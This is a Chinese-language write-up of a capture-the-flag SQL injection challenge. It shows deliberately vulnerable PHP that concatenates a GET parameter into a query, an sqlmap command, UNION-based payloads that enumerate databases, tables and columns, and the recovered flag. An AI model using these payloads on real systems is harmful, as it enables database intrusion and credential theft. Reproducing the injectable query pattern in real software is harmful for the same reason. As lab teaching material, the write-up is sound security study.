---

# 这是什么？SQL ！注一下 ！
一个输入框和提示        
给出了Key Source
```php
<?php
$sql = "SELECT username,password FROM users WHERE id = ".'(((((('.$_GET["id"].'))))))';
$result = $conn->query($sql);
```
## sqlmap
```batch
python sqlmap.py -u "http://node5.anna.nssctf.cn:25805/?id=1" --dbs
```
详情见***通过sqlmap拿下数据库.md***
## 初步尝试
输入1试试看
```sql
# 回显：
Executed Operations:
SELECT username,password FROM users WHERE id = ((((((1))))))
Array ( 
[0] => Array ( 
    [username] => tanji 
    [password] => OHHHHHHH 
    ) 
)
```
有很多括号，构造`id = 1)))))) or 1=1#`      
后台代码变成了
```sql
SELECT username,password FROM users WHERE id = ((((((1)))))) or 1=1#))))))
```
```sql
# 回显：
Executed Operations:
SELECT username,password FROM users WHERE id = ((((((1)))))) or 1=1#))))))
Array ( 
[0] => Array ( 
    [username] => tanji 
    [password] => OHHHHHHH 
    ) 
[1] => Array ( 
    [username] => fake_flag 
    [password] => F1rst_to_Th3_eggggggggg!} (4/4) 
    ) 
)
```
fake_flag,答案不在这里

## 获取数据库信息
```sql
# payload
id=1)))))) union select 1,group_concat(schema_name) from information_schema.schemata#
```
```sql
# 回显：
Array ( 
[0] => Array ( 
    [username] => tanji 
    [password] => OHHHHHHH 
    ) 
[1] => Array ( 
    [username] => 1 
    [password] => information_schema,mysql,ctftraining,performance_schema,test,ctf 
    ) 
)
```
数据库有：
* information_schema
* mysql
* ctftraining
* performance_schema
* test
* ctf

## 获取表名
一个个读取数据库的表名，flag在ctftraining数据库里，直接拿这个演示了
```sql
# payload
?id=1))))))union select 1,group_concat(table_name) from information_schema.tables where table_schema='ctftraining'#
```
```sql
# 回显：
Executed Operations:
SELECT username,password FROM users WHERE id = ((((((1))))))union select 1,group_concat(table_name) from information_schema.tables where table_schema='ctftraining'#))))))

Array ( 
[0] => Array ( 
    [username] => tanji 
    [password] => OHHHHHHH 
    ) 
[1] => Array ( 
    [username] => 1 
    [password] => flag,news,users 
    ) 
)
```
找到flag表了
## 获取字段
```sql
# payload
?id=1)))))) union select 1,group_concat(column_name) from information_schema.columns where table_schema='ctftraining'#
```
```sql
# 回显：
Executed Operations:
SELECT username,password FROM users WHERE id = ((((((1)))))) union select 1,group_concat(column_name) from information_schema.columns where table_schema='ctftraining'#))))))

Array ( 
[0] => Array ( 
    [username] => tanji 
    [password] => OHHHHHHH 
    ) 
[1] => Array ( 
    [username] => 1 
    [password] => flag,id,title,content,time,id,username,password,ip,time 
    ) 
)
```
找到flag字段了
## 获取flag
```sql
# payload
?id=1)))))) union select 1,flag from ctftraining.flag#
```
```sql
# 回显：
Executed Operations:
SELECT username,password FROM users WHERE id = ((((((1))))))union select 1,flag from ctftraining.flag#))))))

Array ( 
[0] => Array ( 
    [username] => tanji 
    [password] => OHHHHHHH 
    ) 
[1] => Array ( 
    [username] => 1 
    [password] => NSSCTF{26433a18-4388-4bd5-865f-d09f2a2443e4} 
    ) 
)
```
flag：NSSCTF{26433a18-4388-4bd5-865f-d09f2a2443e4}